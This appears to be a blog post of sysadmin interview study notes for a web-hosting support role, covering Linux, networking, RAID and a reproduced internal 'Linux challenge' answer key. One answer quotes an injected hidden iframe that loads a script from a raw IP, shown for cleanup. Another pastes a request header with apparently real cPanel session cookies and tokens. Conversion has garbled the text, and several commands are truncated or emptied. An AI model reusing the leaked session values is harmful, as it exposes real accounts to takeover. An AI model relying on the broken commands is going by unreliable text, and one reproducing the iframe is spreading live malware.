---
inFeed: true
hasPage: true
inNav: false
inLanguage: null
starred: false
keywords: []
description: ''
datePublished: '2016-04-07T14:37:41.568Z'
dateModified: '2016-04-07T14:37:01.800Z'
title: Interview Study Guide - Misc
author: []
sourcePath: _posts/2016-04-07-interview-study-guide-misc.md
published: true
authors: []
publisher:
  name: null
  domain: null
  url: null
  favicon: null
url: interview-study-guide-misc/index.html
_type: Article

---
11\. Misc questions

## how does perl work?

## how does php work?

## how ruby on rails work?

(compilations, setting header tags how apache runs it how it's executed on the backend. apache mods)

## how to troubleshoot a server

netstat

iostat

mysqltop20

/scripts/mailperm

mytop

Know about systemd replacing init in CentOS 7

kickstart 

Be able to calculate number of IP addresses when given a subnet - 2 to the x.x.x.x/8(16 or 24 or 32) power minus 2 (the broadcast IP x.x.x.0 and the x.x.x.255?)

/Proc file system -- Various Kernel Statistics

/proc file system provides detailed information about various hardware devices and other Linux kernel information. Common /proc examples:

## 2014-09-12 From my interview

Lifecycle of a process. And on a related note, what happens when you execute a command likelsversus a command likecd. What happens to the process? How is it created? Where is it created? Make sure to discuss physical terminals (tty) versus psuedo terminals (pty). Two users are logged in below.userswitched users toroot.user2opened/etc/grub.conf.

Folders in / and their purposes

* [http://en.wikipedia.org/wiki/Filesystem\_Hierarchy\_Standard][0]
* var is the most accessed directory, probably on the server
* proc is a virtual filesystem because it does not exist after the computer is shutdown, it is stored in RAM

Networking/Subnetting

* Be able to calculate the number of IP addresses in a subnet
* Be able to calculate a subnet
* Know what "stealing bits" is
* Be able to write things in binary and base-10
* ARP
* Layer 2 vs Layer 3 vs Layer 1

Filesystems

* **Attributes of files**
> 
>   * lsattr
>   * **chattr**
> > 
> >     * [http://www.linuxhowtos.org/Tips%20and%20Tricks/chattr.htm][1]
> 
>   * How would you find files that were only editable by root? (Hint: the immutable attribute_i_would be enabled in the attributes of the file

* **What would I find in the output of the_stat_command?**
> 
>   * Be able to recite it from memory

* **More deep understanding of inodes**
> 
>   * For example, be able to answer this: List two things not stored in an inode.
>   * Answer: An inode stores all the information about a regular file, directory, or other file system object, except its data and name.

RAID

* Don't get RAID 10 and RAID 0+1 reversed!!!
* SANs are used to separate the the two drive arrays mounted in RAID 1 for VPS and Dedicated Servers

Positions/Roles in the company

* What are they?
* Role of L3 is to be Junior System Administrator on VPS/Dedi boxes
* Junior System Administrators in Datacenter are the Junior System Administrator on Shared boxes
* L3 is a policy and technical knowledge role model on Tech Support Floor
* L2's know the policies of the company
* SWA's get to work with more advanced configurations of our servers and systems. You can learn additional commands and concepts from this position.

Bash - Commands, Options for the commands, and scripting

* , , |, ||, &, &&, and combining them
* For example:\# error\_logwould delete the error log because it would write nothing to the error\_log, overwriting all the data that was there.
* Need to know as many ways as possible for accomplishing any given task, or extracting a particular piece of information
* Be able to recite the output for each command, and both identify and define each part of that output.
* lsof
* lspci

IPTABLES

* Need to know what it does
* Need to know how it does it
* Learn what you should learn about it in order to use it

## Interview Notes from Another

Why should an you have sudo access on a shared server?

* To work in conjunction and at the discretion of, the admins
* To monitor
* Not restarting services, or modifying config files
* Fix accounts, admins fix server

Boot Process

Power - BIOS - MBR - GRUB - kernel

Differences between ext2, ext3, ext4

* ext2 - no journaling
* ext3 - has journaling
* ext4 - more robust journaling

Inode

* What is it?
* What is stored in it?

Where is the file name stored?

* In the directory structure

Soft link vs hard link

* soft link can store more than one inode; exists in dir structure, as well as has its own inode.

Runlevels

0 - halt

1 - single user

2 - multi-user

3 - multi-user w/networking

4 - user defined

5 - Full multiuser

6 - reboot

Rescue mode - works like booting from a live CD

RAID levels

0+1 - Last function is the striping, first function is mirroring

0 - striping ( for performance )

1 - mirrored ( for redundancy)

5 - block-level striping with distributed parity, one whole "drive" (leg) can fail, and still have all data.

6 -

CHMOD and perms/bits

* drwxr-xr-x 3 root root 4.0K Sep 27 21:13 temp
* Know what all the bits mean and how to change them with chmod WITHOUT using numbers
* chmod \[ugoa\]\[-+=\]\[perms\] file/dir
* u - user; g - group; o - other; a - all
* drwxr-xr-x. 3 root root 4.0K Sep 27 21:13 temp the . means there's an SELinux rule for that
* -rwsr-xr-x

Sticky bit - allows others to access file, when otherwise would not be allowed

s - has execution perms

S - does not have exec perms

First bits

c - character device

s - socket; is bi-directional

p - pipe; one direction

b - block device

*   * file

d - directory

l - symlink

iproute function

* used to route IPs with different NICs

List directories in /

* From memory
* Spreadsheet with this info
* which ones are stored in RAM?
* fix perms in /etc, /sbin, /bin, /usr, /lib, /proc, /dev, can then get other things working

Superblocks

* "Metadata - stores file system structural information such as superblock, inodes, directories"
* [http://www.cyberciti.biz/tips/understanding-unixlinux-file-system-part-i.html][2]
* Contains information about the file system
* File system type
* Size
* Status
* Information about other metadata structures
* Linux maintains multiple, redundant copies on ext3 and ext4, not ext2

Networking

> packet tracer, cisco-net account--marrionet, gsm3,; network simulators

OSI Model - 7 layer

* L1 - protocol used on wire
* L2 - TCP; hardware-to-hardware; based on MAC address; switches
* L3 - IP; iproute, router
* Switch
* caches mac address
* ARP
* table with cached mac address
* ARP ping, goes to router, tells router where it came from with ARP packet
* www - router - switch - hub - server
* understand basic networking
* type in a URL, turns it into an IP and has to find the IP

Subnetting -[http://en.wikipedia.org/wiki/Subnetwork\#IPv4\_subnetting][3]

how many usable hosts can I use on 192.168.0.0/16

/16 CIDR -

[http://en.wikipedia.org/wiki/Classless\_Inter-Domain\_Routing\#CIDR\_notation][4]

/16 denotes the number of bits in the subnet mask

11111111.11111111.00000000.00000000

Host bits = 32 - bits in the subnet mask

Number of hosts = 2 ^ number of host bits

So; 32 - 16 = 16, number of hosts = 2^16 = 65,536

But USABLE hosts is always minus 2, 1 for the broadcast (host all ones), one for the entire network (host all zeros)

Usable hosts is then = 65,534

192.168.0.0/16 what is the subnet mask?

bits in the subnet mask

11111111.11111111.00000000.00000000

Binary to decimal; each successful bit ( starting from the right ) is

increased by 2 ^ n (the first bit on the right being bit number 0 )

8 bits increments (going backwards): 2^7, 2^6, 2^5, etc.

Thus, the above subnet can be calculated as follows:

128+64+32+16+8+4+2+1 . 128+64+32+16+8+4+2+1 . 0 .0

Subnet mask is then: 255.255.0.0

BASH

awk

sed

uniq

sort | uniq | sort

rsync

flag to not overwrite? (-i and maybe --no-clobber, study both)

for loops ?

Server Load

Know how to identify and troubleshoot:

IO Bound

Memory Bound

CPU Bound

Work Wiki L3 Migrations

[http://danceswithkittens.com/books/LPIC/][5]

## The/procfilesystem

The Linux kernel also exposes a great deal of information via the/procfilesystem. To make sense of/procwe need to broaden our concept of what a file is.

Instead of thinking of a file as permanent information stored on a hard drive or a CD or a memory stick, we need to think of it as any information that can be accessed via traditional system calls such as the open/read/write/close calls we saw earlier, and which can, therefore, be accessed by ordinary programs such as cat or less.

The 'files' under/procare entirely a figment of the kernel's imagination and provide a view into many of the kernel's internal data structures.

In fact, many Linux reporting tools present nicely formatted versions of the information they find in the files under/proc. As an example, a listing of /proc/modules will show you a list of currently loaded modules that's strangely reminiscent of the output from lsmod.

In a similar vein, the contents of/proc/meminfoprovides more detail about the current status of the virtual memory system than you could shake a stick at, whereas tools such asvmstatandtopprovide some of this information in a (marginally) more accessible format. As another example,/proc/net/arpshows the current contents of the system's ARP cache; from the command line,arp

-a

shows the same information.

Of particular interest are the 'files' under/proc/sys. As an example, the setting under/proc/sys/net/ipv4/ip\_forwardsays whether the kernel will forward IP datagrams - that is, whether it will function as a gateway. Right now, the kernel is telling us that this is turned off:

[http://www.cs.rutgers.edu/~pxk/416/notes/07-scheduling.html][6]

## Hardware-boot

After power-on or hard reset, control is given to a program stored on read-only memory (normally PROM). In PC we usually call this program the BIOS.

This program normally makes a basic self-test of the machine and accesses nonvolatile memory to read further parameters. This memory in the PC is battery-backed CMOS memory, so most people refer to it as the CMOS, although outside of the PC world, it is usually called nvram (nonvolatile ram).

The parameters stored in the nvram vary between systems, but as a minimum, the hardware boot program should know what is the boot device, or which devices to probe as possible boot devices.

Then the hardware boot stage accesses the boot device, loads the OS Loader, which is located on a fixed position on the boot device, and transfers control to it.

**Note:**We do not cover here booting from network. Those who want to investigate this subject may want to research: DHCP, TFTP, PXE, Etherboot.

### Kernel Startup

When the kernel is loaded, it initializes the devices (via their drivers), starts the swapper (it is a "kernel process", calledkswapdin modern Linux kernels), and mounts the root file system (/).

Some of the parameters that may be passed to the kernel relate to these activities (e.g., You can override the default root file system). For further information on Linux kernel parameters read bootparam(7).

Only then the kernel creates the first (user land) process which is numbered 1\. This process executes the program /sbin/init, passing any parameters that weren't handled by the kernel already.

1. Assuming your public ip address is 74.220.197.216, how and where would you go about finding information about a 500 error that displays when you visit a customer's website? Show an example command.
2. What does the following rewrite condition/rule do?RewriteEngine On
RewriteCond %{HTTP\_REFERER} ^\*.ru$ \[OR\]
RewriteCond %{HTTP\_REFERER} ^\*.blingy.org$
RewriteRule ^(.\*)$ - \[F\]
3. Tell me aboutawk. What's it useful for and when would you use it? Give me some examples of commands that you would run with it.
4. Given the following log format (it's one line) from /var/log/domlogs/global\_log, give an example command thatwould print only the domain to standard out:220.181.94.223 pop59.com - \[22/Apr/2012:14:37:05 -0600\] "GET /product-14177-2@|10000000041\_1@|10000000003-index.html HTTP/1.1" 200 24564 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm\#07)" - 29639 66.147.244.105
5. Using the same log file from above, give an example command that would examine the last 10,000 lines of the log file.Parse out only the domain (you're going to wantawk), and then count the number of occurrences of the domain.Let's also sort the count numerically in reverse order, which will display the highest number of occurrences first.Pipe that to head to display the top 10 most accessed domains. What does your command look like?
6. Do the same to get the top 10 source ip addresses.
7. Tell me about grep. What's it used for?Give me some examples.Also, can you grep a file directly or must the input be passed to it?If you can, how about multiple files?

1. In regards to find, why might you want to use xargs over -exec to execute commands on things you are finding?Answer: xargs runs the command as few times as possible. exec will run the command for each file found
2. Tell me what you know about sed.Demonstrate the basic syntax and show some examples where you might use it in both standard output as well as for altering a file in place.
3. Show me a command where you could view the status of the httpd service in CentOS to see if it's running or not.How about crond?
4. What does it mean for a file to be immutable?When might you encounter such a situation in our environment?
5. How can you view the extended attributes on a file to see whether a file might be immutable, etc?If the file was immutable, what command would remove the immutable flag/attribute?
6. Tell me about rsync. When would you use it and what advantages does it have over cp or scp?

19\. Give me a command that would copy over only files that either only exist in the source or that have been modified. Preserve file attributes, such as ownership, permission, etc.

Let's rsync the contents of/backup2/cpbackup/daily/blargybl/homedir/public\_htmlto/home3/blargybl/public\_html.

1. List a command that would display the currently mounted devices.**A:**You would want tocatthe /proc/mounts file.cat /proc/mounts | grep \`\`whoami\`\`For example:ipatinob@ipatino.bluehoststaff.com \[~\]\# cat /proc/mounts | grep \`whoami\`/dev/sdf1 /home4/ipatinob ext4 rw,nosuid,noatime,nodiratime,nobarrier,commit=30,data=writeback 0 0/dev/sdj /home4/ipatinob.daily ext4 ro,noatime,nodiratime,nobarrier,commit=30,data=writeback 0 0/dev/sdj /home4/ipatinob.weekly ext4 ro,noatime,nodiratime,nobarrier,commit=30,data=writeback 0 0/dev/sdj /home4/ipatinob.monthly ext4 ro,noatime,nodiratime,nobarrier,commit=30,data=writeback 0 0Where is the file that would list the devices that are setup to be initialized or mounted automatically on boot up?**A:**
2. What's one way that you could view how many cores were on a CentOS system?
3. How could you compare two files to see if they were different and output the differences to standard out?
4. Explain basic input/output redirection. i.e., redirecting to/from standard input, standard output, and standard error.
5. What is an strace and give some examples of when you might want to use one.What sorts of ways do you think it might benefit you to use one?
6. Give an example strace command. Output the results to a file, follow any forks/child processes and set the maximum string length to 1000 characters.
7. Describe each piece of the following log:2011-08-03 13:23:00 1Qoh1w-0004ab-2q 
8. Explain what's going on in the following exim log entries (they are related):2011-08-05 14:13:00 1QpQlQ-0005JM-4Y 
9. What command would list all iptables rules in numeric output?
10. What is netstat and what might you use it for?
11. How would you switch to a different tty to login as another user (superuser) on an employee workstation?
12. What command would list the currently configured network interfaces and display information about them, such as ip address, mac address, netmask, broadcast address, etc?
13. Describe each element in the following ls output:-rw-r--r-- 1 skbrimha skbrimha 1021 Mar 17 13:40 highlight-user.js
14. If you wanted to add execute permissions to "other" only (think world), what command might you do that with? Octal notation is fine but bonus if you can add execute to 'other' without using octal notation.
15. What does the 't' in the following ls output mean? What does it do?drwxrwxr-t 2 skbrimha skbrimha 4.0K Jan 31 15:05 tmp/
16. When might you use the disown command?Give an example.
17. How about nohup?
18. What command would you use to list a user's crontab file?What command would allow you to edit a user's crontab file?
19. What are some handy commands that you might use to display the contents of files, read through scripts, configuration files, etc?
20. On a shell prompt, what does a double ampersand do (&&)?How about a double pipe (||)?What about a single ampersand at the end of a command? i.e.,sudo moveuser billy /home3 &
21. What command might you use to list the currently open files on a system?Perhaps something to list things open on a particular home partition?You might use this when looking for things like gigantic error\_log files that are constantly being written to.

## An applicant should know

### Understand and use essential tools:

Use input-output redirection (, , |, 2, etc.).

Use grep and regular expressions to analyze text.

Access remote systems using ssh and VNC.

Log in and switch users in multiuser runlevels.

Archive, compress, unpack, and uncompress files usingtar,star,gzip, andbzip2.

Create and edit text files.

Create, delete, copy, and move files and directories.

Create hard and soft links.

List, set, and change standard ugo/rwx permissions.

Locate, read, and use system documentation including man, info, and files in/usr/share/doc.

### Operate running systems:

Boot, reboot, and shut down a system normally.

Boot systems into different runlevels manually.

Use single-user mode to gain access to a system.

Identify CPU/memory intensive processes, adjust process priority with renice, and kill processes.

Locate and interpret system log files.

Access a virtual machine's console.

Start and stop virtual machines.

Start, stop, and check the status of network services.

### Configure local storage:

List, create, delete, and set partition type for primary, extended, and logical partitions.

Create and remove physical volumes, assign physical volumes to volume groups, and create and delete logical volumes.

Create and configure LUKS-encrypted partitions and logical volumes to prompt for password and mount a decrypted file system at boot.

Configure systems to mount file systems at boot by Universally Unique ID (UUID) or label.

Add new partitions and logical volumes, and swap to a system non-destructively.

### Create and configure file systems:

Create, mount, unmount, and use ext2, ext3, and ext4 file systems.

Mount, unmount, and use LUKS-encrypted file systems.

Mount and unmount CIFS and NFS network file systems.

Configure systems to mount ext4, LUKS-encrypted, and network file systems automatically.

Extend existing unencrypted ext4-formatted logical volumes.

Create and configure set-GID directories for collaboration.

Create and manage Access Control Lists (ACLs).

Diagnose and correct file permission problems.

### Deploy, configure, and maintain systems:

Configure networking and hostname resolution statically or dynamically.

Schedule tasks using cron.

Configure systems to boot into a specific runlevel automatically.

Install Red Hat Enterprise Linux automatically using Kickstart.

Configure a physical machine to host virtual guests.

Install Red Hat Enterprise Linux systems as virtual guests.

Configure systems to launch virtual machines at boot.

Configure network services to start automatically at boot.

Configure a system to run a default configuration HTTP server.

Configure a system to run a default configuration FTP server.

Install and update software packages from Red Hat Network, a remote repository, or from the local file system.

Update the kernel package appropriately to ensure a bootable system.

Modify the system bootloader.

### Manage users and groups:

Create, delete, and modify local user accounts.

Change passwords and adjust password aging for local user accounts.

Create, delete, and modify local groups and group memberships.

Configure a system to use an existing LDAP directory service for user and group information.

### Manage security:

Configure firewall settings using system-config-firewall or iptables.

Set enforcing and permissive modes for SELinux.

List and identify SELinux file and process context.

Restore default file contexts.

Use boolean settings to modify system SELinux settings.

Diagnose and address routine SELinux policy violations.

## what is iscsi?

## Linux challenge

(source:[https://wiki.bluehost.com/index.php/Linux\_challenge][7])

The answers are in an answer key, below.

### Linux Challenge

1. Domain internal resolvers are good, but external is not showing. Where is the problem?
2. How do I see which database matches which application?
3. I just "pushed" DNS. How do I know if it worked?
4. I just added a CNAME. How do I confirm that I did it right?
5. My account has been hacked for awhile. Which backup has not been hacked?
6. How do I see what HTTP header response codes a given URL is returning?
7. A website link returns a 404 error clickingform.pdf. It used to work. Isform.pdfstill even on the server?
8. I'm restoring a fantastico backup and it tells me to remove all the files infantastico\_fileslist.txt. How can I do that with one easy command?
9. How do I search for a file and I'm not sure about the case?
10. How do I find all\*.pptfiles on an account?
11. How do I find all.htaccessfiles on an account?
12. What's the command to create a tarball calledbackup.tar.gzof directory./backup/?
13. Pagewizard broke myindex.html. Please restore just the mainindex.htmlfrom the daily backup.
14. What's the code forphpinfo?
15. My website tries to infect visitors with a virus. I found the following code at the bottom of my pages that shouldn't be there. How can see which pages are infected? How can I remove this from all my pages?

<iframe style=""></iframe>

<\><\>src="http://124.217.252.62/~admin/count.php?o=3"width=0height=0style="hidden"frameborder=0marginheight=0marginwidth=0scrolling=no</\></\>
16. My perl scriptNMSFormMail.plreturns a500 Internal Server Error. In error logs, I see "file has no execute permission: (/home/atmediad/public\_html/cgi/NMSFormMail.pl)". How do I fix that?
17. I copied aphp.iniwith a highmemory\_limitto all folders and still a script gives me a memory error. What else can I do?
18. I am in this guys mail directory trying to identify the actual usage size of a particular email account. What is the command to show size? Which subfolders are using the most space?
19. what are some ways I could transfer a large file to the server from the linux command line?
20. Customer used cPanel Redirects to redirect a hosted domain, but it isn't working as expected. what command can be used to determine where the redirect is actually redirecting to?
21. What is the syntax to import a .sql file into a mysql database?
22. If a customer deletedpublic\_htmland has no backup, but doesn't want to nuke the account, what command can create an emptypublic\_htmlfolder?
23. A perl script won't run. When I view it inviI see a bunch of^Mline break characters, how can I fix that?
24. How might I change the wordpress theme without logging intowp-login.php?
25. I need to make a tarball (compressed folder) of a certain folder. How do I do that?
26. A customer got migrated to a multi-home box and now his scripts are broken because it is using/home/userinstead of/home1/user. How do I fix that?
27. What are some ways to back up a whole account before making changes that affect several files?
28. How can I find how much space a customer is actually using in their entire hosting account?
29. How do I download a system backup directly into an account?
30. What command will output all the databases on the account in a nice tidy list?
31. How do I export a database?
32. How do I see a list of all active mysql connections for all my databases?
33. How can I export a single file from a tar archive?
34. How can I tell how many files a customer has in their account?
35. How can I rename all my.htaccessfiles to.htaccess.bak?
36. How do I rename all my.htaccess.bakfiles back to.htaccess?

### Linux challenge answers

(source:[https://wiki.bluehost.com/index.php/Linux\_challenge\_answers][8])

This page is a sample answer key to the Linux Challenge questions above, plus more Linux-related questions with answers that everyone is welcome to contribute.

1. Domain internal resolvers are good, but external is not showing. Where is the problem?Use the whois command to see if the nameservers even point to us.whois yourdomain.com
If the nameservers point to us, use dig to see if they have a badly pointed A record.dig yourdomain.com
dig www.yourdomain.com
2. How do I see which database matches which application?Use the find command with grep to search files for the database prefix (username\_).List all filenames in and under the current directory that contain database settings:find ./ -name \\\*.php -exec grep -Hl \`whoami\`\_ {}\\;Show me the filenames along with the database names:find ./ -name \\\*.php -exec grep -H \`whoami\`\_ {}\\;Better - shows file namesgrep -lr --include=\*.php "\`whoami\`\_" ~/public\_html/
3. I just "pushed" DNS. how do I know if it worked?Use dig to see if you get a good answer from NS0\. NS0 has a 1-minute cache, so if you barely pushed it and don't get a good response, give it a minute.dig yourdomain.com @ns0.bluehost.com
dig yourdomain.com @ns0.hostmonster.com
dig yourdomain.com @ns0.fastdomain.com
4. I just added a CNAME. How do I confirm that I did it right?Use dig with NS0 to check it.dig www.yourdomain.com @ns0.bluehost.com
dig mail.yourdomain.com @ns0.hostmonster.com
dig docs.yourdomain.com @ns0.fastdomain.com
5. My account has been hacked for awhile. Which backup has not been hacked?Use diff to see whether the page in question is the same as what's in each of the backups.diff -q ~/public\_html/index.html /home/\`whoami\`.daily/public\_html/index.html
diff -q ~/public\_html/index.html /home/\`whoami\`.weekly/public\_html/index.html
If you want to see what is different about the files being compared.diff -y ~/public\_html/index.html /home/\`whoami\`.daily/public\_html/index.html
diff -y ~/public\_html/index.html /home/\`whoami\`.weekly/public\_html/index.html
Use diff to compare whole directories.diff -q ~/public\_html/ /home/\`whoami\`.daily/public\_html/
diff -q ~/public\_html/ /home/\`whoami\`.weekly/public\_html/
If you want to see what is different about the files in the public\_html folder.diff -y ~/public\_html/ /home/\`whoami\`.daily/public\_html/
diff -y ~/public\_html/ /home/\`whoami\`.weekly/public\_html/
6. How do I see what HTTP header response codes a given URL is returning?Use curl -I (same as curl --head).curl -I www.yourdomain.com
HTTP/1.1 200 OK
curl -I www.yourdomain.com/foo
HTTP/1.1 404 Not Found
curl -I www.yourdomain.com/bar
HTTP/1.1 301 Moved Permanently
7. A website link returns a 404 error clicking form.pdf. It used to work. Is form.pdf still even on the server?Use find to discover the true location of the file, if it exists at all.find ./ -name form.pdf
If they changed the case, this will also find it.find ./ -iname form.pdf
8. I'm restoring a fantastico backup and it tells me to remove all the files in fantastico\_fileslist.txt. How can I do that with one easy command?Use cat with xargs to perform the rm -fr action on each filename specified within.cat fantastico\_fileslist.txt | xargs rm -fr
9. How do I search for a file and I'm not sure about the case?Use find with the -iname flag.find ./ -iname background.jpg
./BackGround.JPG
10. How do I find all \*.ppt files on an account?Use find and escape the wildcard character with a backslash.find ./ -name \\\*.ppt
./presentation.ppt
11. How do I find all .htaccess files on an account?Use find.find ./ -name .htaccess
12. What's the command to create a tarball called backup.tar.gz of directory ./backup/ ?Use tar with the following syntax:tar -zcf backup.tar.gz backup/
13. Pagewizard broke my index.html. Please restore just the main index.html from the daily backup.Use cp to get the file, but backup the file you're replacing first for safety.cd ~/public\_html/
mv index.html index.html.bak
cp /home/\`whoami\`.daily/public\_html/index.html .
14. What's the code for phpinfo?(); ?One way to create the above code is as follows:echo '' phpinfo.php
15. My website tries to infect visitors with a virus. I found the following code at the bottom of my pages that shouldn't be there. How can see which pages are infected? How can I remove this from all my pages?

<iframe style=""></iframe>

Use the find and sed commands to look for and remove the code. This one is easy to screw up, so definitely have a backup.cp -a public\_html/ public\_html.bakfind ./public\_html/ -type f -exec sed -i 's/Alternately, use the find and replace commands to do it.find ./ -name page2.html -exec replace '

<iframe src="http://124.217.252.62/~admin/count.php?o=3" width="0" height="0" frameborder="0" scrolling="no" style=""></iframe>

' '' -- {} \\;See also Virus on site infects visitors.
16. My perl script NMSFormMail.pl returns a 500 Internal Server error. In error logs, I see "file has no execute permission: (/home/atmediad/public\_html/cgi/NMSFormMail.pl)". How do I fix that?Use the chmod command to set 755 permissions.chmod 755 ~/public\_html/cgi/NMSFormMail.pl
17. I copied a php.ini with a high memory\_limit to all folders and still a script gives me a memory error. What else can I do?Use find to search php files for the memory\_limit & max\_memory setting also. Most resource intensivefind ./ -name \\\*.php -exec grep -H memory\_limit {} \\;find ./ -name \\\*.php -exec grep -H max\_memory {} \\;Good - Less resource intensivefind ./ -name \\\*.php | xargs grep "max\_memory"Better - No point in doing a find if grep can do the findfind2perl ./ -name \\\*.php | perl |xargs grep "max\_memory"
grep -r --include=\*.php "max\_memory" .
or if you just want file names use the -l flaggrep -lr --include=\*.php "max\_memory" .Once the culprit is found, you can increase or preferably comment out the line altogether. And for heavens sake, delete all those extra php.ini files.
18. I am in this guys mail directory trying to identify the actual usage size of a particular email account. What is the command to show size? Which subfolders are using the most space?Use du. To summarize the actual usage in human readable form:du -shTo see which folders use what space, sorted by size:du --max-depth=1 | sort -n
19. What are some ways I could transfer a large file to the server from the linux command line?Use scp.scp bigfile.zip yourdoma@yourdomain.com:~/public\_html/Use rsync.rsync bigfile.zip yourdoma@yourdomain.com:~/public\_html/
20. Customer used cpanelRedirects to redirect a hosted domain, but it isn't working as expected. Where is it actually trying to redirect?Use curl with the -IL flags.curl -IL bluehost.comHTTP/1.1 302 FoundDate: Thu, 24 Apr 2008 13:02:31 GMTServer: Apache/2.0.61 (CentOS)Set-Cookie: last\_ref=-; path=/Set-Cookie: r=house%5ENOAFFILIATE%5E-; domain=.bluehost.com; path=/; expires=Wed, 23-Jul-2008 13:02:31 GMTLocation: http://www.bluehost.com/Connection: closeContent-Type: text/html; charset=ISO-8859-1HTTP/1.1 200 OKDate: Thu, 24 Apr 2008 13:02:31 GMTServer: Apache/2.0.61 (CentOS)Set-Cookie: last\_ref=-; path=/Set-Cookie: r=house%5ENOAFFILIATE%5E-; domain=.bluehost.com; path=/; expires=Wed, 23-Jul-2008 13:02:31 GMTContent-length: 25485Last-Modified: Tue, 22 Apr 2008 18:47:38 GMTConnection: closeContent-Type: text/html; charset=ISO-8859-1Alternatively, use curl with grep to filter the output.curl -sIL bluehost.com | grep -e HTTP -e LocationHTTP/1.1 302 FoundLocation: http://www.bluehost.com/HTTP/1.1 200 OKIn the above examples, it finds bluehost.com and redirects it to www.bluehost.com.
21. What is the syntax to import a .sql file into a mysql database?Use the mysql command from the folder where the .sql file is located:mysql -u username -p database\_name 
22. If a customer deleted public\_html and has no backup, but doesn't want to nuke the account, what command can create an empty public\_html folder?Use the mkdir command.mkdir public\_html
23. A perl script won't run. When I view it in 'vi' I see a bunch of ^M line break characters, how can I fix that?Use dos2unix.dos2unix filename.plYou can also use the following PHP script[http://scripts.v2joecr.com/file-folder-fixer.txt][9]which also sets the permissions back to the servers defaults for various files & folders.
24. How might I change the wordpress theme without logging into wp-admin?Usemvto rename the theme file. This is necessary if there is theme corruption that prevents the admin from being able to log in.cd wp-content/themes/mv 3c-black-letterhead/ 3c-black-letterhead.badWordPress will realize it can't use the designated theme anymore, and then fall back to the default theme.
25. I need to make a tarball (compressed folder) of a certain folder. How do I do that?Use the tar command. If you wanted to make one of the public\_html directory:tar -cvzf archivename.tar.gz ~/public\_html
26. A customer got migrated to a multi-home box and now his scripts are broken because it is using /home/user instead of /home1/user. How do I fix that?Use the find/replace command by looking through all files in the account from the customer's home directory. It's a good idea to do a backup of thepublic\_htmldirectory first. See the section for that.find ./ -type f -exec replace '/home/theirusername' '/home1/theirusername' -- {} \\;
27. What are some ways to back up a whole account before making changes that affect several files?Start with du -sh public\_html/ to see how much space we're dealing with. If less than a Gig or two, you might do this...cp public\_html/ public\_html.bakIf its much bigger than that, you might use rsync to quickly backup the account to your own PC.rsync -avz --progress yourdoma@yourdomain.com:~/public\_html .
28. How can I find how much space a customer is actually using in their entire hosting account?Use the following command:du -sh
29. How do I download a system backup directly into an account?Maybe with --save-cookies and --load-cookies[http://stackoverflow.com/questions/4272770/wget-with-authentication][10]This no longer works. cPanel will not accept basic authentication Use wget with the following syntax. Lets assume my cpanel username is username, my password is password and my cpanel IP address is 74.220.207.132.wget http://username:password@74.220.207.132:2082/getsysbackup/daily.tar.gzwget http://username:password@74.220.207.132:2082/getsysbackup/weekly.tar.gzI got the syntax in the first place by logging into cPanel, clicking Backups, then viewing the source code of the page. It gives the code for the Daily and Weekly buttons, for example /getsysbackup/daily.tar.gz. Add that to the[http://74.220.207.132:2082][11]part of the cPanel URL in the address bar, then insert the username and password right after the[http://][12]part to authenticate it. I use this when I want to restore mail, specific addon domains, or databases from the one of the system backups. It saves me having to go to an Junior Admin (in training) for something I would otherwise get a permission denied error for. The buttons now default to https and 2083:Request URL:https://box725.bluehost.com:2083/getsysbackup/daily.tar.gz?restoretype=daily&button=12%2F10%2F2013
Request Method:GET
Status Code:200 OK
Request Headers
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8
Accept-Encoding:gzip,deflate,sdch
Accept-Language:en-US,en;q=0.8,ca;q=0.6,da;q=0.4
Cache-Control:no-cache
Connection:keep-alive
Cookie:fcustid=C839538810809;incap\_ses\_124\_88047=3ALVTsA6mil+mrCVzom4AdcXZlIAAAAA/BZnCgK40AqTo1CgjIqREg==;visid\_incap\_88047=fJAi4T8mRJOh2so26rqZwbKuQlIAAAAAQUIPAAAAAABPqx/NK6Cu8xsBvAsGI2Oa;incap\_ses\_32\_88047=iGm/C8GYPh3ELNwCULBxAEuxcFIAAAAAPfkKR8CmtPGGAyK3YMG2nA==;incap\_ses\_50\_88047=SsqLWT5SeHZglBcRAqOxAJnncFIAAAAA2Q1SwqpkfbDsLp1kpCMk3A==;custid=C839538810809;tk=tkc%3A849ca9f3afbcdbb13baca165;dmalert=1386998950;\_\_utma=133467357.1047781196.1364366086.1386743256.1387085312.90;\_\_utmc=133467357;\_\_utmz=133467357.1386743256.89.18.utmcsr=chat.bluehost.com|utmccn=(referral)|utmcmd=referral|utmcct=/dashboard/;\_\_utmv=133467357.employee;port2082=yes;shortcuts\_info=bluehost-test-vps3.com%3A192.163.226.5%3Abluehpp6%3Abluehost;port2083=yes;user\_login=swest.bluehoststaff.com;cpsession=swestblu%3aLzRIdUPoeXNCT\_FffK6COkjqmmP3xp\_o4dRWWnMhadFo60Seij4IaGsWoZ\_QMm84%2c9635076e8ce6122d95a358901f610a3a0ab6b690cfb55ceb029cb4b1ff69786c;langedit=;lang=;cprelogin=no;currency=USD;\_\_utma=197341884.1538824566.1387109235.1387109235.1387111389.2;\_\_utmb=197341884.3.10.1387111389;\_\_utmc=197341884;\_\_utmz=197341884.1387109235.1.1.utmcsr=1170392.my.bluehost.com|utmccn=(referral)|utmcmd=referral|utmcct=/cgi-bin/cplogin
Host:box725.bluehost.com:2083
Pragma:no-cache
Referer:https://box725.bluehost.com:2083/frontend/bluehost/backup/index.html
User-Agent:Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36
Query String Parameters
restoretype:daily
button:12/10/2013
Response Headers
Cache-Control:no-cache, must-revalidate
Connection:close
Content-Type:application/x-gzip
Pragma:no-cache
Server:cpsrvd/11.32.7.3
swestblu@swest.bluehoststaff.com \[~\]\# wget https://swestblu:\#\#\#\#\#\#\#@box725.bluehost.com:2083/getsysbackup/daily.tar.gz?restoretype=daily&button=12%2F10%2F2013\[1\] 23980
swestblu@swest.bluehoststaff.com \[~\]\# --2013-12-15 05:53:51-- https://swestblu:\*password\*@box725.bluehost.com:2083/getsysbackup/daily.tar.gz?restoretype=daily
Resolving box725.bluehost.com... 66.147.244.225
Connecting to box725.bluehost.com|66.147.244.225|:2083... connected.
HTTP request sent, awaiting response... 401 Access Denied
Unknown authentication scheme.
Authorization failed.
\[1\]+ Exit 6 wget https://swestblu:\#\#\#\#\#\#\#@box725.bluehost.com:2083/getsysbackup/daily.tar.gz?restoretype=daily
